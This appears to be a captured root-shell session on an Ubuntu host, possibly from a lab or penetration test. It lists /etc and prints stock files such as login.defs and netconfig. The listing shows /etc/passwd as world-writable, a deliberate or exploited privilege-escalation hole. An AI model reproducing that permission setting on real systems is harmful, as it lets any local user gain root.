+drwxr-xr-x 1 root root    4096 Jan 11 16:18 rc3.d
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 rc4.d
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 rc5.d
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 rc6.d
+drwxr-xr-x 2 root root    4096 May 28  2025 rcS.d
+-rw-r--r-- 1 root root     254 Mar 12 09:02 resolv.conf
+lrwxrwxrwx 1 root root      13 Apr  8  2024 rmt -> /usr/sbin/rmt
+-rw-r--r-- 1 root root     911 Oct 17  2022 rpc
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 security
+drwxr-xr-x 2 root root    4096 May 28  2025 selinux
+-rw-r--r-- 1 root root   12813 Mar 27  2021 services
+drwxr-xr-x 2 root root    4096 Jan 11 16:18 sgml
+-rw-r----- 1 root shadow   767 Jan 16 03:05 shadow
+-rw-r----- 1 root shadow   664 Jan 11 16:18 shadow-
+-rw-r--r-- 1 root root     118 May 28  2025 shells
+drwxr-xr-x 2 root root    4096 May 28  2025 skel
+drwxr-xr-x 4 root root    4096 Jan  7 19:09 ssl
+-rw-r--r-- 1 root root      43 Jan 12 17:24 subgid
+-rw-r--r-- 1 root root      20 May 28  2025 subgid-
+-rw-r--r-- 1 root root      43 Jan 12 17:24 subuid
+-rw-r--r-- 1 root root      20 May 28  2025 subuid-
+-rw-r--r-- 1 root root    4343 Jun 25  2025 sudo.conf
+-rw-r--r-- 1 root root    9804 Jun 25  2025 sudo_logsrvd.conf
+-r--r----- 1 root root    1800 Jan 29  2024 sudoers
+drwxr-xr-x 2 root root    4096 Jan 12 18:13 sudoers.d
+-rw-r--r-- 1 root root    2209 Mar 24  2024 sysctl.conf
+drwxr-xr-x 1 root root    4096 Jan 11 16:17 sysctl.d
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 systemd
+drwxr-xr-x 2 root root    4096 May 28  2025 terminfo
+-rw-r--r-- 1 root root      18 Jan  7 19:09 timezone
+drwxr-xr-x 2 root root    4096 Nov 25 15:16 tmpfiles.d
+-rw-r--r-- 1 root root    1260 Jan 27  2023 ucf.conf
+drwxr-xr-x 3 root root    4096 Jan  7 19:05 ufw
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 update-motd.d
+lrwxrwxrwx 1 root root      16 Jan 11 16:17 vconsole.conf -> default/keyboard
+-rw-r--r-- 1 root root    4942 Jun 19  2024 wgetrc
+-rw-r--r-- 1 root root     681 Apr  8  2024 xattr.conf
+drwxr-xr-x 4 root root    4096 Jan 11 16:18 xdg
+drwxr-xr-x 2 root root    4096 Jan 11 16:18 xml
+root@ip-10-0-135-180:/etc# cat netconfig
+cat netconfig
+#
+# The network configuration file. This file is currently only used in
+# conjunction with the TI-RPC code in the libtirpc library.
+#
+# Entries consist of:
+#
+#       <network_id> <semantics> <flags> <protofamily> <protoname> \
+#               <device> <nametoaddr_libs>
+#
+# The <device> and <nametoaddr_libs> fields are always empty in this
+# implementation.
+#
+udp        tpi_clts      v     inet     udp     -       -
+tcp        tpi_cots_ord  v     inet     tcp     -       -
+udp6       tpi_clts      v     inet6    udp     -       -
+tcp6       tpi_cots_ord  v     inet6    tcp     -       -
+rawip      tpi_raw       -     inet      -      -       -
+local      tpi_cots_ord  -     loopback  -      -       -
+unix       tpi_cots_ord  -     loopback  -      -       -
+root@ip-10-0-135-180:/etc# cat network
+cat network
+cat: network: No such file or directory
+root@ip-10-0-135-180:/etc# cat networks
+cat networks
+# symbolic names for networks, see networks(5) for more information
+link-local 169.254.0.0
+root@ip-10-0-135-180:/etc# cat legal
+cat legal
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+root@ip-10-0-135-180:/etc# cat ^[[200~/usr/share/doc/*/copyright.^[[201~
+cat /usr/share/doc/*/copyright.
+cat: '/usr/share/doc/*/copyright.': No such file or directory
+root@ip-10-0-135-180:/etc# ls -la
+ls -la
+total 636
+drwxr-xr-x 1 root root    4096 Mar 12 09:02 .
+drwxr-xr-x 1 root root    4096 Mar 12 09:02 ..
+-rw------- 1 root root       0 May 28  2025 .pwd.lock
+drwxr-xr-x 2 root root    4096 Jan 11 16:18 PackageKit
+drwxr-xr-x 3 root root    4096 Jan 11 16:18 X11
+-rw-r--r-- 1 root root    3444 Jul  5  2023 adduser.conf
+drwxr-xr-x 1 root root    4096 Jan 12 18:12 alternatives
+drwxr-xr-x 1 root root    4096 Jan  7 19:09 apache2
+drwxr-xr-x 3 root root    4096 Jan  7 19:09 apparmor.d
+drwxr-xr-x 1 root root    4096 May 28  2025 apt
+-rw-r--r-- 1 root root    2319 Mar 31  2024 bash.bashrc
+drwxr-xr-x 2 root root    4096 Jan 11 14:33 bash_completion.d
+-rw-r--r-- 1 root root     367 Aug  2  2022 bindresvport.blacklist
+drwxr-xr-x 2 root root    4096 Nov 25 15:16 binfmt.d
+drwxr-xr-x 3 root root    4096 Jan  7 19:05 ca-certificates
+-rw-r--r-- 1 root root    6288 Jan  7 19:09 ca-certificates.conf
+drwxr-xr-x 2 root root    4096 May 28  2025 cloud
+drwx------ 2 root root    4096 Nov 25 15:16 credstore
+drwx------ 2 root root    4096 Nov 25 15:16 credstore.encrypted
+drwxr-xr-x 1 root root    4096 Jan  7 19:09 cron.d
+drwxr-xr-x 1 root root    4096 Jan 11 14:32 cron.daily
+drwxr-xr-x 4 root root    4096 Jan 11 16:17 dbus-1
+-rw-r--r-- 1 root root    2967 Apr 12  2024 debconf.conf
+-rw-r--r-- 1 root root      11 Apr 22  2024 debian_version
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 default
+-rw-r--r-- 1 root root    1706 Jul  5  2023 deluser.conf
+drwxr-xr-x 3 root root    4096 Jan 11 16:18 dhcp
+drwxr-xr-x 1 root root    4096 Jan 11 14:33 dpkg
+-rw-r--r-- 1 root root     685 Apr  8  2024 e2scrub.conf
+-rw-r--r-- 1 root root     106 May 28  2025 environment
+-rw-r--r-- 1 root root    1853 Oct 17  2022 ethertypes
+-rw-r--r-- 1 root root      37 May 28  2025 fstab
+-rw-r--r-- 1 root root    2584 Jan 30  2024 gai.conf
+drwxr-xr-x 2 root root    4096 May 28  2025 gnutls
+-rw-r--r-- 1 root root    3986 Dec  3 12:01 gprofng.rc
+-rw-r--r-- 1 root root     684 Jan 15 12:00 group
+-rw-r--r-- 1 root root     684 Jan 15 12:00 group-
+-rw-r----- 1 root shadow   587 Jan 15 12:00 gshadow
+-rw-r----- 1 root shadow   587 Jan 15 12:00 gshadow-
+drwxr-xr-x 3 root root    4096 Jan  7 19:05 gss
+-rw-r--r-- 1 root root      92 Apr 22  2024 host.conf
+-rw-r--r-- 1 root root      16 Mar 12 09:02 hostname
+-rw-r--r-- 1 root root     221 Mar 12 09:02 hosts
+drwxr-xr-x 2 root root    4096 Jan  7 19:09 init
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 init.d
+-rw-r--r-- 1 root root    1875 Mar 31  2024 inputrc
+-rw-r--r-- 1 root root      26 Feb  5  2025 issue
+-rw-r--r-- 1 root root      19 Feb  5  2025 issue.net
+drwxr-xr-x 1 root root    4096 Jan 11 16:17 kernel
+-rw-r--r-- 1 root root   12915 Jan 12 17:41 ld.so.cache
+-rw-r--r-- 1 root root      34 Aug  2  2022 ld.so.conf
+drwxr-xr-x 1 root root    4096 Jan 11 14:33 ld.so.conf.d
+drwxr-xr-x 2 root root    4096 Jan  7 19:05 ldap
+-rw-r--r-- 1 root root     267 Apr 22  2024 legal
+-rw-r--r-- 1 root root     191 Mar 30  2024 libaudit.conf
+-rw-r--r-- 1 root root      13 May 28  2025 locale.conf
+lrwxrwxrwx 1 root root      37 Jan  7 19:09 localtime -> /usr/share/zoneinfo/America/Sao_Paulo
+drwxr-xr-x 5 root root    4096 Jan  7 19:05 logcheck
+-rw-r--r-- 1 root root   12345 Feb 22  2024 login.defs
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 logrotate.d
+-rw-r--r-- 1 root root     104 Feb  5  2025 lsb-release
+-rw-r--r-- 1 root root      33 Jan 11 16:17 machine-id
+-rw-r--r-- 1 root root     288 Mar 30  2024 mecabrc
+-rw-r--r-- 1 root root   75113 Jul 12  2023 mime.types
+-rw-r--r-- 1 root root     744 Apr  8  2024 mke2fs.conf
+drwxr-xr-x 2 root root    4096 Jan 11 16:17 modules-load.d
+lrwxrwxrwx 1 root root      12 Mar 12 09:02 mtab -> /proc/mounts
+drwxr-xr-x 1 root root    4096 Jan 15 12:02 mysql
+-rw-r--r-- 1 root root   11424 May 23  2023 nanorc
+-rw-r--r-- 1 root root     767 Mar 30  2024 netconfig
+drwxr-xr-x 8 root root    4096 Jan 11 16:18 networkd-dispatcher
+-rw-r--r-- 1 root root      91 Apr 22  2024 networks
+-rw-r--r-- 1 root root     526 Jan 11 16:18 nsswitch.conf
+drwxr-xr-x 2 root root    4096 May 28  2025 opt
+lrwxrwxrwx 1 root root      21 Feb  5  2025 os-release -> ../usr/lib/os-release
+-rw-r--r-- 1 root root     552 Oct 13  2022 pam.conf
+drwxr-xr-x 1 root root    4096 Jan 12 17:41 pam.d
+-rw-rw-rw- 1 root root    1350 Mar 12 09:09 passwd
+-rw-r--r-- 1 root root    1264 Jan 11 16:18 passwd-
+drwxr-xr-x 3 root root    4096 Jan  7 19:05 perl
+drwxr-xr-x 3 root root    4096 Jan  7 19:05 php
+drwxr-xr-x 3 root root    4096 Jan 11 16:18 pm
+drwxr-xr-x 3 root root    4096 Jan 11 16:18 polkit-1
+-rw-r--r-- 1 root root     582 Apr 22  2024 profile
+drwxr-xr-x 2 root root    4096 May 28  2025 profile.d
+-rw-r--r-- 1 root root    3144 Oct 17  2022 protocols
+drwxr-xr-x 2 root root    4096 Jan 11 16:18 python3
+drwxr-xr-x 2 root root    4096 Jan 11 16:17 python3.12
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 rc0.d
+drwxr-xr-x 1 root root    4096 Jan  7 19:09 rc1.d
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 rc2.d
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 rc3.d
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 rc4.d
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 rc5.d
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 rc6.d
+drwxr-xr-x 2 root root    4096 May 28  2025 rcS.d
+-rw-r--r-- 1 root root     254 Mar 12 09:02 resolv.conf
+lrwxrwxrwx 1 root root      13 Apr  8  2024 rmt -> /usr/sbin/rmt
+-rw-r--r-- 1 root root     911 Oct 17  2022 rpc
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 security
+drwxr-xr-x 2 root root    4096 May 28  2025 selinux
+-rw-r--r-- 1 root root   12813 Mar 27  2021 services
+drwxr-xr-x 2 root root    4096 Jan 11 16:18 sgml
+-rw-r----- 1 root shadow   767 Jan 16 03:05 shadow
+-rw-r----- 1 root shadow   664 Jan 11 16:18 shadow-
+-rw-r--r-- 1 root root     118 May 28  2025 shells
+drwxr-xr-x 2 root root    4096 May 28  2025 skel
+drwxr-xr-x 4 root root    4096 Jan  7 19:09 ssl
+-rw-r--r-- 1 root root      43 Jan 12 17:24 subgid
+-rw-r--r-- 1 root root      20 May 28  2025 subgid-
+-rw-r--r-- 1 root root      43 Jan 12 17:24 subuid
+-rw-r--r-- 1 root root      20 May 28  2025 subuid-
+-rw-r--r-- 1 root root    4343 Jun 25  2025 sudo.conf
+-rw-r--r-- 1 root root    9804 Jun 25  2025 sudo_logsrvd.conf
+-r--r----- 1 root root    1800 Jan 29  2024 sudoers
+drwxr-xr-x 2 root root    4096 Jan 12 18:13 sudoers.d
+-rw-r--r-- 1 root root    2209 Mar 24  2024 sysctl.conf
+drwxr-xr-x 1 root root    4096 Jan 11 16:17 sysctl.d
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 systemd
+drwxr-xr-x 2 root root    4096 May 28  2025 terminfo
+-rw-r--r-- 1 root root      18 Jan  7 19:09 timezone
+drwxr-xr-x 2 root root    4096 Nov 25 15:16 tmpfiles.d
+-rw-r--r-- 1 root root    1260 Jan 27  2023 ucf.conf
+drwxr-xr-x 3 root root    4096 Jan  7 19:05 ufw
+drwxr-xr-x 1 root root    4096 Jan 11 16:18 update-motd.d
+lrwxrwxrwx 1 root root      16 Jan 11 16:17 vconsole.conf -> default/keyboard
+-rw-r--r-- 1 root root    4942 Jun 19  2024 wgetrc
+-rw-r--r-- 1 root root     681 Apr  8  2024 xattr.conf
+drwxr-xr-x 4 root root    4096 Jan 11 16:18 xdg
+drwxr-xr-x 2 root root    4096 Jan 11 16:18 xml
+root@ip-10-0-135-180:/etc# cat ^[[200~login.defs
+^[[201~cat 
+login.defs                     login.defs
+#
+# /etc/login.defs - Configuration control definitions for the login package.
+#
+# Three items must be defined:  MAIL_DIR, ENV_SUPATH, and ENV_PATH.
+# If unspecified, some arbitrary (and possibly incorrect) value will
+# be assumed.  All other items are optional - if not specified then
+# the described action or option will be inhibited.
+#
+# Comment lines (lines beginning with "#") and blank lines are ignored.
+#
+# Modified for Linux.  --marekm
+
+# REQUIRED for useradd/userdel/usermod
+#   Directory where mailboxes reside, _or_ name of file, relative to the
+#   home directory.  If you _do_ define MAIL_DIR and MAIL_FILE,
+#   MAIL_DIR takes precedence.
+#
+#   Essentially:
+#      - MAIL_DIR defines the location of users mail spool files
+#        (for mbox use) by appending the username to MAIL_DIR as defined
+#        below.
+#      - MAIL_FILE defines the location of the users mail spool files as the
+#        fully-qualified filename obtained by prepending the user home
+#        directory before $MAIL_FILE
+#
+# NOTE: This is no more used for setting up users MAIL environment variable
+#       which is, starting from shadow 4.0.12-1 in Debian, entirely the
+#       job of the pam_mail PAM modules
+#       See default PAM configuration files provided for
+#       login, su, etc.
+#
+# This is a temporary situation: setting these variables will soon
+# move to /etc/default/useradd and the variables will then be
+# no more supported
+MAIL_DIR        /var/mail
+#MAIL_FILE      .mail
+
+#
+# Enable logging and display of /var/log/faillog login failure info.
+# This option conflicts with the pam_tally PAM module.
+#
+FAILLOG_ENAB  yes
+
+#
+# Enable display of unknown usernames when login failures are recorded.
+#
+# WARNING: Unknown usernames may become world readable. 
+# See #290803 and #298773 for details about how this could become a security
+# concern
+LOG_UNKFAIL_ENAB no
+
+#
+# Enable logging of successful logins
+#
+LOG_OK_LOGINS  no
+
+#
+# Enable "syslog" logging of su activity - in addition to sulog file logging.
+# SYSLOG_SG_ENAB does the same for newgrp and sg.
+#
+SYSLOG_SU_ENAB  yes
+SYSLOG_SG_ENAB  yes
+
+#
+# If defined, all su activity is logged to this file.
+#
+#SULOG_FILE /var/log/sulog
+
+#
+# If defined, file which maps tty line to TERM environment parameter.
+# Each line of the file is in a format something like "vt100  tty01".
+#
+#TTYTYPE_FILE /etc/ttytype
+
+#
+# If defined, login failures will be logged here in a utmp format
+# last, when invoked as lastb, will read /var/log/btmp, so...
+#
+FTMP_FILE /var/log/btmp
+
+#
+# If defined, the command name to display when running "su -".  For
+# example, if this is defined as "su" then a "ps" will display the
+# command is "-su".  If not defined, then "ps" would display the
+# name of the shell actually being run, e.g. something like "-sh".
+#
+SU_NAME  su
+
+#
+# If defined, file which inhibits all the usual chatter during the login
+# sequence.  If a full pathname, then hushed mode will be enabled if the
+# user's name or shell are found in the file.  If not a full pathname, then
+# hushed mode will be enabled if the file exists in the user's home directory.
+#
+HUSHLOGIN_FILE .hushlogin
+#HUSHLOGIN_FILE /etc/hushlogins
+
+#
+# *REQUIRED*  The default PATH settings, for superuser and normal users.
+#
+# (they are minimal, add the rest in the shell startup files)
+ENV_SUPATH PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+ENV_PATH PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+#
+# Terminal permissions
+#
+# TTYGROUP Login tty will be assigned this group ownership.
+# TTYPERM  Login tty will be set to this permission.
+#
+# If you have a "write" program which is "setgid" to a special group
+# which owns the terminals, define TTYGROUP to the group number and
+# TTYPERM to 0620.  Otherwise leave TTYGROUP commented out and assign
+# TTYPERM to either 622 or 600.
+#
+# In Debian /usr/bin/bsd-write or similar programs are setgid tty
+# However, the default and recommended value for TTYPERM is still 0600
+# to not allow anyone to write to anyone else console or terminal
+
+# Users can still allow other people to write them by issuing 
+# the "mesg y" command.
+
+TTYGROUP tty
+TTYPERM  0600
+
+#
+# Login configuration initializations:
+#
+# ERASECHAR Terminal ERASE character ('\010' = backspace).
+# KILLCHAR Terminal KILL character ('\025' = CTRL/U).
+# UMASK  Default "umask" value.
+#
+# The ERASECHAR and KILLCHAR are used only on System V machines.
+# 
+# UMASK is the default umask value for pam_umask and is used by
+# useradd and newusers to set the mode of the new home directories.
+# 022 is the "historical" value in Debian for UMASK
+# 027, or even 077, could be considered better for privacy
+# There is no One True Answer here : each sysadmin must make up his/her
+# mind.
+#
+# If USERGROUPS_ENAB is set to "yes", that will modify this UMASK default value
+# for private user groups, i. e. the uid is the same as gid, and username is
+# the same as the primary group name: for these, the user permissions will be
+# used as group permissions, e. g. 022 will become 002.
+#
+# Prefix these values with "0" to get octal, "0x" to get hexadecimal.
+#
+ERASECHAR 0177
+KILLCHAR 025
+UMASK  022
+
+# HOME_MODE is used by useradd(8) and newusers(8) to set the mode for new
+# home directories.
+# If HOME_MODE is not set, the value of UMASK is used to create the mode.
+HOME_MODE 0750
+
+#
+# Password aging controls:
+#
+# PASS_MAX_DAYS Maximum number of days a password may be used.
+# PASS_MIN_DAYS Minimum number of days allowed between password changes.
+# PASS_WARN_AGE Number of days warning given before a password expires.
+#
+PASS_MAX_DAYS 99999
+PASS_MIN_DAYS 0
+PASS_WARN_AGE 7
+
+#
+# Min/max values for automatic uid selection in useradd
+#
+UID_MIN    1000
+UID_MAX   60000
+# System accounts
+#SYS_UID_MIN    100
+#SYS_UID_MAX    999
+# Extra per user uids
+SUB_UID_MIN     100000
+SUB_UID_MAX  600100000
+SUB_UID_COUNT      65536
+
+#
+# Min/max values for automatic gid selection in groupadd
+#
+GID_MIN    1000
+GID_MAX   60000
+# System accounts
+#SYS_GID_MIN    100
+#SYS_GID_MAX    999
+# Extra per user group ids
+SUB_GID_MIN     100000
+SUB_GID_MAX  600100000
+SUB_GID_COUNT      65536
+
+#
+# Max number of login retries if password is bad. This will most likely be
+# overriden by PAM, since the default pam_unix module has it's own built
+# in of 3 retries. However, this is a safe fallback in case you are using
+# an authentication module that does not enforce PAM_MAXTRIES.
+#
+LOGIN_RETRIES  5
+
+#
+# Max time in seconds for login
+#
+LOGIN_TIMEOUT  60
+
+#
+# Which fields may be changed by regular users using chfn - use
+# any combination of letters "frwh" (full name, room number, work
+# phone, home phone).  If not defined, no changes are allowed.
+# For backward compatibility, "yes" = "rwh" and "no" = "frwh".
+# 
+CHFN_RESTRICT  rwh
+
+#
+# Should login be allowed if we can't cd to the home directory?
+# Default is no.
+#
+DEFAULT_HOME yes
+
+#
+# If defined, this command is run when removing a user.
+# It should remove any at/cron/print jobs etc. owned by
+# the user to be removed (passed as the first argument).
+#
+#USERDEL_CMD /usr/sbin/userdel_local
+
+#
+# Enable setting of the umask group bits to be the same as owner bits
+# (examples: 022 -> 002, 077 -> 007) for non-root users, if the uid is
+# the same as gid, and username is the same as the primary group name.
+#
+# If set to yes, userdel will remove the user's group if it contains no
+# more members, and useradd will create by default a group with the name
+# of the user.
+#
+USERGROUPS_ENAB yes
+
+#
+# Instead of the real user shell, the program specified by this parameter
+# will be launched, although its visible name (argv[0]) will be the shell's.
+# The program may do whatever it wants (logging, additional authentification,
+# banner, ...) before running the actual shell.
+#
+# FAKE_SHELL /bin/fakeshell
+
+#
+# If defined, either full pathname of a file containing device names or
+# a ":" delimited list of device names.  Root logins will be allowed only
+# upon these devices.
+#
+# This variable is used by login and su.
+#
+#CONSOLE /etc/consoles
+#CONSOLE console:tty01:tty02:tty03:tty04
+
+#
+# List of groups to add to the user's supplementary group set
+# when logging in on the console (as determined by the CONSOLE
+# setting).  Default is none.
+#
+# Use with caution - it is possible for users to gain permanent
+# access to these groups, even when not logged in on the console.
+# How to do it is left as an exercise for the reader...
+#
+# This variable is used by login and su.
+#
+#CONSOLE_GROUPS  floppy:audio:cdrom
+
+#
+# If set to "yes", new passwords will be encrypted using the MD5-based
+# algorithm compatible with the one used by recent releases of FreeBSD.
+# It supports passwords of unlimited length and longer salt strings.
+# Set to "no" if you need to copy encrypted passwords to other systems
+# which don't understand the new algorithm.  Default is "no".
+#
+# This variable is deprecated. You should use ENCRYPT_METHOD.
+#
+#MD5_CRYPT_ENAB no
+
+#
+# If set to MD5, MD5-based algorithm will be used for encrypting password
+# If set to SHA256, SHA256-based algorithm will be used for encrypting password
+# If set to SHA512, SHA512-based algorithm will be used for encrypting password
+# If set to BCRYPT, BCRYPT-based algorithm will be used for encrypting password
+# If set to YESCRYPT, YESCRYPT-based algorithm will be used for encrypting password
+# If set to DES, DES-based algorithm will be used for encrypting password (default)
+# MD5 and DES should not be used for new hashes, see crypt(5) for recommendations.
+# Overrides the MD5_CRYPT_ENAB option
+#
+# Note: It is recommended to use a value consistent with
+# the PAM modules configuration.
+#
+ENCRYPT_METHOD SHA512
+
+#
+# Only works if ENCRYPT_METHOD is set to SHA256 or SHA512.
+#
+# Define the number of SHA rounds.
+# With a lot of rounds, it is more difficult to brute-force the password.
+# However, more CPU resources will be needed to authenticate users if
+# this value is increased.
+#
+# If not specified, the libc will choose the default number of rounds (5000),
+# which is orders of magnitude too low for modern hardware.
+# The values must be within the 1000-999999999 range.
+# If only one of the MIN or MAX values is set, then this value will be used.
+# If MIN > MAX, the highest value will be used.
+#
+#SHA_CRYPT_MIN_ROUNDS 5000
+#SHA_CRYPT_MAX_ROUNDS 5000
+
+#
+# Only works if ENCRYPT_METHOD is set to YESCRYPT.
+#
+# Define the YESCRYPT cost factor.
+# With a higher cost factor, it is more difficult to brute-force the password.
+# However, more CPU time and more memory will be needed to authenticate users
+# if this value is increased.
+#
+# If not specified, a cost factor of 5 will be used.
+# The value must be within the 1-11 range.
+#
+#YESCRYPT_COST_FACTOR 5
+
+#
+# The pwck(8) utility emits a warning for any system account with a home
+# directory that does not exist.  Some system accounts intentionally do
+# not have a home directory.  Such accounts may have this string as
+# their home directory in /etc/passwd to avoid a spurious warning.
+#
+NONEXISTENT /nonexistent
+
+#
+# Allow newuidmap and newgidmap when running under an alternative
+# primary group.
+#
+#GRANT_AUX_GROUP_SUBIDS yes
+
+#
+# Select the HMAC cryptography algorithm.
+# Used in pam_timestamp module to calculate the keyed-hash message
+# authentication code.
+#
+# Note: It is recommended to check hmac(3) to see the possible algorithms
+# that are available in your system.
+#
+#HMAC_CRYPTO_ALGO SHA512
+
+################# OBSOLETED BY PAM ##############
+#      #
+# These options are now handled by PAM. Please #
+# edit the appropriate file in /etc/pam.d/ to #
+# enable the equivelants of them.
+#
+###############
+
+#MOTD_FILE
+#DIALUPS_CHECK_ENAB
+#LASTLOG_ENAB
+#MAIL_CHECK_ENAB
+#OBSCURE_CHECKS_ENAB
+#PORTTIME_CHECKS_ENAB
+#SU_WHEEL_ONLY
+#CRACKLIB_DICTPATH
+#PASS_CHANGE_TRIES
+#PASS_ALWAYS_WARN
+#ENVIRON_FILE
+#NOLOGINS_FILE
+#ISSUE_FILE
+#PASS_MIN_LEN
+#PASS_MAX_LEN
+#ULIMIT
+#ENV_HZ
+#CHFN_AUTH
+#CHSH_AUTH
+#FAIL_DELAY
+
+################# OBSOLETED #######################
+#        #
+# These options are no more handled by shadow.    #
+#                                                 #
+# Shadow utilities will display a warning if they #
+# still appear.                                   #
+#                                                 #
+###################################################
+
+# CLOSE_SESSIONS
+# LOGIN_STRING
+# NO_PASSWORD_CONSOLE
+# QMAIL_DIR
+
+
+
+
+
